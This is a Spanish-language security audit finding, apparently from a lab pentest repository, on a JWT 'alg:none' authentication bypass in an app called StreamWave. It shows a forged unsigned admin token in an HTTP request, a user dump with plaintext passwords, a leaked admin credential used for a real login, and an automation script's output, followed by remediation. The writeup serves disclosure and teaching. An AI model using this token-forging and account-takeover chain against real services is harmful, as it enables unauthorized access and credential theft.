# 🔑 F-030 — 🏆 Bypass de autenticación JWT (`alg:none`): dump de usuarios + toma de cuenta admin real

![Severidad](https://img.shields.io/badge/severidad-cr%C3%ADtico-critical) ![CVSS](https://img.shields.io/badge/CVSS-9.8-critical) ![CWE](https://img.shields.io/badge/CWE-347-blue) ![App](https://img.shields.io/badge/app-StreamWave-red)

> [!IMPORTANT]
> StreamWave tiene una API JWT en paralelo a su sesión web (`/api/me`, `/api/admin/*`). El servidor acepta tokens con cabecera `{"alg":"none"}` y **sin firma**: basta con construir el payload a mano, sin conocer ningún secreto ni contraseña, para obtener `"role":"admin"`. Con eso se vuelca la base de 18 usuarios de la plataforma **con contraseñas en texto plano**, incluida la del propio `admin` — verificada contra el login real de sesión. El hallazgo más grave de toda la auditoría de StreamWave.

## 📖 Contexto

**Endpoints afectados:** `GET /api/me`, `GET /api/admin/users` (API con JWT, `Authorization: Bearer <token>`), obtenido normalmente en `POST /api/auth/token`.

Se confirmó primero que el control de rol **sí funciona** con tokens legítimos:

| Autorización | `GET /api/admin/users` |
|---|---|
| Sin token | `401` |
| Token legítimo, firmado, `role:"user"` | `403` |
| Token forjado, `alg:none`, sin firma, `role:"admin"` | **`200`** |

El fallo está exclusivamente en que el servidor no verifica la firma cuando el propio token declara que no la lleva.

## 🔬 Explotación paso a paso

Token forjado — header `{"alg":"none"}`, payload con `role:"admin"`, firma vacía:

<img src="../assets/57-streamwave-jwt-forjado-alg-none-decoded.png" width="650">

```
GET /api/me HTTP/1.1
Host: 172.17.0.2:9090
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJkaXNwbGF5X25hbWUiOiJBZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU0NDExMiwiZXhwIjoxNzkzNjMwNTEyfQ.
```

<img src="../assets/58-streamwave-jwt-bypass-api-me-admin.png" width="650">

`200 OK`, `"role":"admin"` — sin haber iniciado sesión en ningún sitio.

Mismo header contra `/api/admin/users`:

<img src="../assets/59-streamwave-jwt-admin-users-dump.png" width="650">

**18 usuarios, contraseñas en texto plano**, incluido `admin:streamwave`.

### Cierre de la cadena: cuenta real tomada

```
POST /login
username=admin&password=streamwave
```

<img src="../assets/60-streamwave-admin-session-real-confirmada.png" width="650">

Sesión real como "StreamWave Staff" — botón "Sign out" visible, avatar `@admin`.

### 🤖 Automatización

[`scripts/streamwave_jwt_auth_bypass.py`](../scripts/streamwave_jwt_auth_bypass.py) — forja el token, lo prueba contra `/api/me` y `/api/admin/users`, vuelca la tabla de usuarios y, si encuentra `admin`, prueba automáticamente el login real de sesión con esa contraseña. Cadena completa en una sola ejecución:

```bash
python3 scripts/streamwave_jwt_auth_bypass.py
```

```
[+] BYPASS DE AUTENTICACION CONFIRMADO: role 'admin' aceptado sin firma
[+] 18 USUARIOS VOLCADOS, CONTRASENAS EN TEXTO PLANO
[+] LOGIN REAL CONFIRMADO: admin / streamwave funciona.
    Cadena completa: JWT forjado -> dump de usuarios -> toma de cuenta admin real.
```

## 💥 Impacto

> [!CAUTION]
> De cero credenciales a control total de la cuenta de administrador en 3 peticiones HTTP, sin depender de ningún otro hallazgo de StreamWave.

- Bypass total de autenticación/autorización — cualquiera obtiene privilegios de admin sin cuenta previa.
- Fuga completa de la base de usuarios (18 cuentas) con **contraseñas reales en texto plano**, no hasheadas (CWE-256 adicional).
- Toma de cuenta real del administrador, confirmada contra el login de producción, no solo contra la API JWT.
- Agravante: la propia contraseña filtrada de `admin` es literalmente el nombre de la plataforma (`streamwave`) — política de contraseñas prácticamente inexistente, sin 2FA que mitigara el impacto.
- Dado que las contraseñas no están hasheadas y pueden estar reutilizadas por los usuarios en otros servicios, el impacto trasciende la propia StreamWave.

## 🛡️ Remediación

- Verificar la firma con el algoritmo que *el servidor* espera (fijo), rechazando explícitamente cualquier token `alg:"none"` — pasar siempre la lista de algoritmos permitidos a la librería JWT, nunca confiar en el `alg` del propio token.
- Hashear todas las contraseñas (bcrypt/scrypt/Argon2 con salt), nunca texto plano.
- Rotar inmediatamente todas las contraseñas filtradas durante esta auditoría.
- Política de contraseñas real + 2FA para cuentas con privilegios administrativos.

## Hallazgos relacionados

Independiente de [F-026](F-026-idor-streamwave-watch.md)/[F-027](F-027-secretos-expuestos-streamwave.md)/[F-028](F-028-ssrf-fetch-thumb-streamwave.md)/[F-029](F-029-race-condition-likes-streamwave.md) — no necesita ninguno de ellos para explotarse.

---
⬅ [Volver al índice de writeups](README.md) · [README principal](../README.md) · [Informe técnico (PDF)](../docs/informe-BigShop.pdf)
